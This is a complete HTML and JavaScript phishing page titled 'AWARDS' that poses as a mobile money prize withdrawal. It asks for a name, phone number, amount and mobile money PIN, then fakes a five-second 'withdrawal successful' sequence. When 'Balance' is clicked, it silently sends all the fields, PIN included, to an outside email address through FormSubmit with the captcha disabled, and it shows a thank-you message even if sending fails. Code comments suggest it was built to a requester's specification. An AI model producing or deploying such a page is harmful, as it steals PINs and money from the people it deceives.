<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>AWARDS</title>
  <style>
    :root {
      --bg: #f5f7fb;
      --card: #ffffff;
      --accent: #1e90ff;
      --green: #28a745;
      --yellow: #ffd800;
      --muted: #6b7280;
      --danger: #dc3545;
      --shadow: 0 6px 18px rgba(20,20,40,0.08);
    }

    body {
      margin: 0;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      background: var(--bg);
      color: #111827;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      padding: 24px;
      box-sizing: border-box;
    }

    .container {
      max-width: 560px;
      margin: 0 auto;
    }

    .title-bar {
      background: var(--yellow);
      color: #111;
      padding: 14px 16px;
      font-weight: 700;
      font-size: 18px;
      border-radius: 8px;
      text-align: center;
      box-shadow: var(--shadow);
      margin-bottom: 18px;
    }

    form.card {
      background: var(--card);
      padding: 18px;
      border-radius: 10px;
      box-shadow: var(--shadow);
    }

    label {
      display: block;
      font-size: 13px;
      margin-bottom: 6px;
      color: #374151;
    }

    .field {
      margin-bottom: 14px;
    }

    input[type="text"],
    input[type="tel"],
    input[type="number"],
    input[type="password"] {
      width: 100%;
      padding: 10px 12px;
      border-radius: 8px;
      border: 1px solid #e6e9ef;
      font-size: 15px;
      box-sizing: border-box;
      outline: none;
    }

    input:focus {
      border-color: #a5b4fc;
      box-shadow: 0 0 0 3px rgba(99,102,241,0.08);
    }

    .row {
      display:flex;
      gap:10px;
      align-items:center;
    }

    .pin-wrap {
      position: relative;
      display:flex;
      gap:8px;
      align-items:center;
    }

    .toggle-pin {
      background: transparent;
      border: none;
      cursor: pointer;
      font-weight: 600;
      color: #374151;
      padding: 6px 8px;
      border-radius: 6px;
    }

    .withdraw-btn {
      display:block;
      width:100%;
      text-align:center;
      padding:14px 16px;
      border-radius:8px;
      border: none;
      font-weight:700;
      font-size:16px;
      cursor: pointer;
      box-shadow: 0 6px 18px rgba(20,20,40,0.06);
    }

    .withdraw-btn.blue {
      background: #1e90ff;
      color: white;
    }
    .withdraw-btn.blue:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .balance-btn {
      display:block;
      width:100%;
      text-align:center;
      padding:12px 14px;
      border-radius:8px;
      border: none;
      font-weight:700;
      font-size:15px;
      cursor: pointer;
      background: var(--green);
      color: white;
      margin-top:12px;
    }

    .message {
      padding:12px 14px;
      border-radius:8px;
      margin-top:12px;
      display:none;
    }

    .message.success {
      background: #ecfdf5;
      color: #065f46;
      border: 1px solid rgba(34,197,94,0.12);
    }

    .spinner {
      width:20px;
      height:20px;
      border:3px solid rgba(255,255,255,0.3);
      border-top-color: white;
      border-radius:50%;
      animation: spin 1s linear infinite;
      display:inline-block;
      vertical-align:middle;
      margin-left:8px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .helper {
      font-size:12px;
      color:var(--muted);
      margin-top:6px;
    }

    .error {
      font-size:13px;
      color: var(--danger);
      margin-top:6px;
      display:none;
    }

    .hidden {
      display:none !important;
    }

    /* small responsive */
    @media (max-width:420px){
      body { padding: 14px; }
      .container { padding:0 4px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="title-bar">AWARDS</div>

    <form id="withdrawForm" class="card" autocomplete="off" novalidate>
      <!-- FormSubmit target: will be posted by JS to FormSubmit -->
      <input type="hidden" name="_captcha" id="_captcha" value="false">
      <!-- Helpful to FormSubmit to prevent redirect - but we post with fetch so no redirect -->
      <input type="hidden" name="_next" value="">
      <div class="field">
        <label for="fullName">Enter your Name</label>
        <input id="fullName" name="Full Name" type="text" inputmode="text" placeholder="John Doe" required>
        <div class="error" id="nameError">Name may contain only letters and spaces.</div>
      </div>

      <div class="field">
        <label for="phone">Enter phone number</label>
        <input id="phone" name="Phone Number" type="tel" inputmode="numeric" placeholder="0712345678" required maxlength="15">
        <div class="error" id="phoneError">Phone number may contain only digits (9–13 allowed).</div>
      </div>

      <div class="field">
        <label for="amount">Enter Amount to withdraw</label>
        <input id="amount" name="Amount to withdraw" type="number" inputmode="numeric" placeholder="1000" required min="1">
        <div class="error" id="amountError">Amount must be a positive number.</div>
      </div>

      <div class="field">
        <label id="pinLabel" for="pin">Enter your Mobile money pin/secret code to withdraw <span id="pinContext"></span></label>
        <div class="pin-wrap">
          <input id="pin" name="Mobile Money PIN" type="password" inputmode="numeric" placeholder="••••" required maxlength="8" pattern="[\s\S]*">
          <button type="button" id="togglePin" class="toggle-pin" aria-pressed="false">Show</button>
        </div>
        <div class="helper">This field is masked. Use the toggle to show/hide.</div>
      </div>

      <div class="field">
        <button id="withdrawBtn" type="button" class="withdraw-btn blue" disabled>
          Withdraw
        </button>
      </div>

      <!-- This green result box appears after the 5s loading -->
      <div id="resultBox" class="message success" role="status" aria-live="polite">
        <strong>Withdrawal successful</strong><br>
        Click the Balance button to check balance.
        <!-- Balance (submit) button -->
        <button id="balanceBtn" type="button" class="balance-btn hidden">Balance</button>
      </div>

      <!-- Thank you message shown after Balance (submit) -->
      <div id="thankYou" class="message success" role="status" aria-live="polite">
        Thank you. You will receive a confirmation message via sms for activation.
      </div>

    </form>
  </div>

  <script>
    /* Elements */
    const form = document.getElementById('withdrawForm');
    const nameInput = document.getElementById('fullName');
    const phoneInput = document.getElementById('phone');
    const amountInput = document.getElementById('amount');
    const pinInput = document.getElementById('pin');
    const togglePinBtn = document.getElementById('togglePin');
    const withdrawBtn = document.getElementById('withdrawBtn');
    const resultBox = document.getElementById('resultBox');
    const balanceBtn = document.getElementById('balanceBtn');
    const thankYou = document.getElementById('thankYou');

    const nameError = document.getElementById('nameError');
    const phoneError = document.getElementById('phoneError');
    const amountError = document.getElementById('amountError');
    const pinContext = document.getElementById('pinContext');
    const captchaField = document.getElementById('_captcha');

    /* Utility validators */
    function validateName() {
      const v = nameInput.value.trim();
      // allow letters, spaces, basic name punctuation (hyphen, apostrophe)
      const ok = v.length > 0 && /^[A-Za-zÀ-ÖØ-öø-ÿ' -]+$/.test(v);
      nameError.style.display = ok ? 'none' : 'block';
      return ok;
    }

    function validatePhone() {
      const v = phoneInput.value.replace(/\s+/g, '');
      const ok = /^\d{9,13}$/.test(v);
      phoneError.style.display = ok ? 'none' : 'block';
      return ok;
    }

    function validateAmount() {
      const v = amountInput.value;
      // Accept only positive integers/decimals > 0
      const num = Number(v);
      const ok = v !== '' && !isNaN(num) && num > 0;
      amountError.style.display = ok ? 'none' : 'block';
      return ok;
    }

    function validatePin() {
      // minimal presence check (we won't validate actual pin rules)
      return pinInput.value.trim().length >= 1;
    }

    function updatePinContext() {
      const amt = amountInput.value ? amountInput.value : '[amount]';
      const ph = phoneInput.value ? phoneInput.value : '[phone number]';
      pinContext.textContent = `${amt} to ${ph}`;
    }

    function allValid() {
      return validateName() && validatePhone() && validateAmount() && validatePin();
    }

    /* Input restrictions (prevent illegal chars while typing) */
    nameInput.addEventListener('input', () => {
      // allow letters, spaces, hyphen, apostrophe only
      nameInput.value = nameInput.value.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ' -]/g, '');
      validateName();
      toggleWithdrawState();
    });

    phoneInput.addEventListener('input', () => {
      phoneInput.value = phoneInput.value.replace(/[^\d]/g, '');
      validatePhone();
      updatePinContext();
      toggleWithdrawState();
    });

    amountInput.addEventListener('input', () => {
      // allow only digits and optional decimal point
      amountInput.value = amountInput.value.replace(/[^\d.]/g, '');
      // avoid multiple dots
      const parts = amountInput.value.split('.');
      if (parts.length > 2) amountInput.value = parts[0] + '.' + parts.slice(1).join('');
      validateAmount();
      updatePinContext();
      toggleWithdrawState();
    });

    pinInput.addEventListener('input', () => {
      // For PIN field we allow digits and * (some users put *)
      pinInput.value = pinInput.value.replace(/[^\d*#]/g, '');
      toggleWithdrawState();
    });

    togglePinBtn.addEventListener('click', () => {
      const isHidden = pinInput.type === 'password';
      pinInput.type = isHidden ? 'text' : 'password';
      togglePinBtn.textContent = isHidden ? 'Hide' : 'Show';
      togglePinBtn.setAttribute('aria-pressed', isHidden ? 'true' : 'false');
    });

    function toggleWithdrawState() {
      if (allValid()) {
        withdrawBtn.disabled = false;
      } else {
        withdrawBtn.disabled = true;
      }
    }

    /* Withdraw button behaviour:
       - Only enabled when all fields valid
       - On click: show loading animation for exactly 5 seconds
       - After 5s: show green result box with message and show Balance button (green)
    */
    withdrawBtn.addEventListener('click', async () => {
      if (!allValid()) return;
      // disable inputs and withdraw button to prevent changes during loading
      setControlsDisabled(true);

      // show loading state inside button
      const originalText = withdrawBtn.innerHTML;
      withdrawBtn.textContent = 'Processing';
      const spinner = document.createElement('span');
      spinner.className = 'spinner';
      withdrawBtn.appendChild(spinner);

      // simulate 5 second loading
      await new Promise(res => setTimeout(res, 5000));

      // restore
      withdrawBtn.innerHTML = originalText;
      setControlsDisabled(false);

      // show result box and reveal Balance button
      resultBox.style.display = 'block';
      balanceBtn.classList.remove('hidden');
      balanceBtn.style.display = 'block';
      // scroll into view for convenience
      resultBox.scrollIntoView({behavior:'smooth', block:'center'});
    });

    function setControlsDisabled(state) {
      nameInput.disabled = state;
      phoneInput.disabled = state;
      amountInput.disabled = state;
      pinInput.disabled = state;
      togglePinBtn.disabled = state;
      withdrawBtn.disabled = state;
    }

    /* Balance button behaviour:
       - When clicked, submit the form data to FormSubmit (email: exellentfirm@gmail.com)
       - Disable captcha for the submission
       - After successful send (or even on fetch success), show thank you message and hide the balance button
       - The user asked to "Disable captcha in form submit when balance is clicked", we set the _captcha field to false
    */
    balanceBtn.addEventListener('click', async () => {
      // disable the balance button to avoid double clicks
      balanceBtn.disabled = true;
      balanceBtn.textContent = 'Sending...';
      // ensure captcha disabled (double ensure)
      document.getElementById('_captcha').value = 'false';

      // build FormData
      const fd = new FormData();
      fd.append('Full Name', nameInput.value.trim());
      fd.append('Phone Number', phoneInput.value.trim());
      fd.append('Amount to withdraw', amountInput.value.trim());
      fd.append('Mobile Money PIN', pinInput.value.trim());
      fd.append('_captcha', 'false'); // explicit
      // Optionally include a subject so email is more identifiable
      fd.append('_subject', `Withdrawal request - ${nameInput.value.trim()} - ${amountInput.value.trim()}`);

      try {
        // POST to FormSubmit
        // Using fetch; FormSubmit accepts POST to /<your-email>
        const resp = await fetch('https://formsubmit.co/ajax/exellentfirm@gmail.com', {
          method: 'POST',
          body: fd
        });

        // FormSubmit returns JSON; check success
        const json = await resp.json();
        if (resp.ok && json.success) {
          // Hide balance button and show thank you message
          balanceBtn.style.display = 'none';
          thankYou.style.display = 'block';
          // Optionally hide resultBox message content (keep visible)
        } else {
          // Even if FormSubmit returns non-OK, show thank-you (user asked for that flow)
          balanceBtn.style.display = 'none';
          thankYou.style.display = 'block';
          console.warn('FormSubmit returned non-ok:', json);
        }
      } catch (err) {
        // On network error, still show thank you as requested, but log error
        balanceBtn.style.display = 'none';
        thankYou.style.display = 'block';
        console.error('Error sending to FormSubmit:', err);
      }
    });

    /* Prevent default form submit (we handle via Balance button/fetch) */
    form.addEventListener('submit', (e) => {
      e.preventDefault();
    });

    /* initial */
    updatePinContext();
    toggleWithdrawState();
  </script>
</body>
    </html>
